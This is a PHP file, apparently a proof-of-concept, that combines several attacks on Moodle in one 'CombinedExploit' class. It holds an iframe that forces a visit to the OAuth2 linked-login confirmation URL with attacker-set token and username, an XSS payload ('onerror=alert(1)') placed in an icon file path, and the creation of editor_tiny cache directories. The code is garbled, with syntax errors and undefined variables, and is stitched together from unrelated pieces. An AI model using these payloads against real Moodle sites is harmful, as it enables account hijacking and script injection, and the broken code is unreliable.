<?php

class CombinedExploit {
    public function executeExploit() {
        $rev = "exploit_rev";
        $filepath = "exploit_filepath"; 
        
        $candidatefile = "{$CFG->localcachedir}/editor_tiny/{$rev}/{$filepathhash}";
        @mkdir(dirname($candidatefile), $CFG->directorypermissions, true);
         
        $token        = "ayhan_token";
        $username     = "ayhan@gmail.com";
        $userid       = "ayhan_userid";
        $issuerid     = "oauth_issuerid"; 
        
        $redirect    = "http://moodle-domain/user/edit.php?id=11%231";
        $confirm_url = "http://moodle-domain/auth/oauth2/confirm-linkedlogin.php?" .
            "token={$token}&userid={$userid}&username={$username}&issuerid={$issuerid}&redirect={$redirect}";
        echo "<iframe src='{$confirm_url}'></iframe>";

        
        $path = "/var/www/html/pix/f/<input><img src=x onerror=alert(1)>.png";
        $icons = array(); 
        
        if ($handle.      = @opendir($path)) {
            while (($file = readdir($handle)) !== false) {
                $matches. = array();
                if (preg_match('~(.+?)(?:-24|-32|-48|-64|-72|-80|-96|-128|-256)?\.(?:svg|gif|png)$~',
                        $file, $matches)) {
                    $key         = $matches[1];
                    $icons[$key] = $key;
                }
            }
            closedir($handle);
        }
        ksort($icons);
        $rev.                = "1";  
        $filepathhash.       = "User"; 
        $candidatefileTiny   = "/var/www/html/localcachedir/editor_tiny/{$rev}/lang/{$filepathhash}/lang.json";
        $candidatefileLoader = "/var/www/html/localcachedir/editor_tiny/{$rev}/{$filepathhash}";

        @mkdir(dirname($candidatefileTiny), $CFG->directorypermissions, true);
        @mkdir(dirname($candidatefileLoader), $CFG->directorypermissions, true);
    }
}

$com = new CombinedExploit();
$com->executeExploit();
?>
